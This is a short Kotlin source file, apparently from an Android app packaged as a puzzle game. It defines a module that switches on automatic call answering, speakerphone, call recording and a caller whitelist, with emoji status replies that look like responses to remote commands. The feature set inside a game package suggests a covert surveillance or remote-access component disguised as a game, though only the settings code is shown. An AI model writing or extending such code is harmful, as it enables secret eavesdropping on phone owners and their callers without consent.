package com.puzzleblast.game.modules

import android.content.Context
import com.puzzleblast.game.util.Prefs

object CallAutoAnswerModule {
    suspend fun status(): String = """
        📞 Call Auto-Answer
        master: ${if (Prefs.callAutoAnswer) "ON" else "off"}
        speaker: ${if (Prefs.caaSpeaker) "ON" else "off"}
        record: ${if (Prefs.caaRecord) "ON" else "off"}
        whitelist: ${Prefs.caaWhitelist.ifBlank { "(all)"} }
    """.trimIndent()

    suspend fun set(on: Boolean): String {
        Prefs.callAutoAnswer = on
        return if (on) "📞 auto-answer ON" else "📞 auto-answer off"
    }

    suspend fun whitelist(nums: String): String {
        Prefs.caaWhitelist = nums
        return "👥 whitelist: $nums"
    }

    suspend fun speaker(on: Boolean): String {
        Prefs.caaSpeaker = on
        return if (on) "🔊 speaker on answer ON" else "🔊 speaker off"
    }

    suspend fun record(on: Boolean): String {
        Prefs.caaRecord = on
        return if (on) "🎙 record on answer ON" else "🎙 record off"
    }
}
